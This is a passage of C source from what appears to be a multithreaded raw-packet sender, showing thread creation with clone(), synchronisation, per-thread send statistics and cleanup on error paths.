		if(r<0){
			perror("cannot read file");
			close(fd);
			goto err3;
		}
		}
		close(fd);
	}
	cthreads=0;
	//pthread_mutexattr_init(&sattr);
	//pthread_mutexattr_settype(&sattr,PTHREAD_MUTEX_ADAPTIVE_NP);
	pthread_mutex_init(&gmutex,NULL);
	//pthread_mutex_init(&smutex,NULL);
	//pthread_mutex_lock(&smutex);
	sent_sum=sent_sum_ok=0;
	packlen+=data_size;
	ip_tlen=(uint16_t)(packlen-sizeof(struct ethhdr));
	fd=0;
	read_stdin_mutex=0;
	fd=clone(read_stdin,read_stdin_stack+TSTACK_SIZE,CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_THREAD|CLONE_SIGHAND|CLONE_PTRACE,NULL);
	for(r1=0;r1<nthreads;++r1)
	{	targ[r1].id=r1;
		targ[r1].sent=0;
		targ[r1].sent_ok=0;
		targ[r1].sent_size=0;
		targ[r1].end=0;
		targ[r1].mutex=0;
	//	pthread_mutex_init(&targ[r1].mutex,NULL);
		if((targ[r1].tid=clone(prewriting,tstack+TSTACK_SIZE+r1*TSTACK_SIZE,CLONE_FS|CLONE_VM|CLONE_THREAD|CLONE_SIGHAND|CLONE_PTRACE,targ+r1))<0){
			fprintf(stderr,"cannot cteate thread %ld:%s\n",r1,strerror(errno));
			targ[r1].id=-1;
			continue;
		}
		++cthreads;
	}
	if(cthreads==0){
		fprintf(stderr,"no thread created\n");
		goto err2;
	}
	r2=1;
	while(r2){
	pthread_mutex_lock(&gmutex);
	r2=(rthreads<cthreads);
	pthread_mutex_unlock(&gmutex);
	}
	fprintf(stderr,"%ld threads started\n",cthreads);
	signal(SIGINT,psig);
	signal(SIGALRM,psig);
	smutex=1;
	wakef(&smutex,cthreads);
//thread create completed.
	//while(1){
	//	r=read(STDIN_FILENO,input,INPUT_SIZE);
	//	if(r==0)running=0;
	//}
	r1=r2=0;
	while(r1<nthreads){
		if(targ[r1].id==-1){
			++r1;
			continue;
		}
		if(waitf(&targ[r1].mutex,0)<0&&errno==EINTR){
			continue;
		}
		sent_sum+=targ[r1].sent;
		sent_sum_ok+=targ[r1].sent_ok;
		sent_sum_size+=targ[r1].sent_size;
		aborted_sum+=targ[r1].aborted;
		nerror_sum+=targ[r1].nerror;
		if(targ[r1].end==1)++r2;
		//printf("t %ld end\n",targ[r1].id);
		++r1;
	}
	if(fd>0){
		tgkill(pid,fd,SIGUSR1);
		waitf(&read_stdin_mutex,0);
	}
	if(r2<cthreads){
	fprintf(stderr,"%ld threads failed\n",cthreads-r2);
	if(r2==0)errexit("Failed.\n");
	}
	fprintf(stderr,"\n%lu packets tried,%lu (%lu%%),(%lu,%s)written\n",sent_sum,sent_sum_ok,sent_sum!=0?100*sent_sum_ok/sent_sum:0l,sent_sum_size,b2hu(sent_sum_size,input1));
	if(nerror_sum>0){
		if(aborted_sum>0)fprintf(stderr,"%ld errors occured (excluded %ld avoided)\n",nerror_sum,aborted_sum);
		else fprintf(stderr,"%ld errors occured\n",nerror_sum);
	}
	free(tstack);
//	free(targ);
	if(data_from_file!=NULL)free(data_from_file);
	write(STDERR_FILENO,"Done\n",strlen("Done\n"));
	return 0;
err3:
	if(data_from_file!=NULL)free(data_from_file);
err2:
	//if(targ!=NULL)free(targ);
//err1:
	if(tstack!=NULL)free(tstack);
err0:
	errexit("Failed\n");
return -1;
}

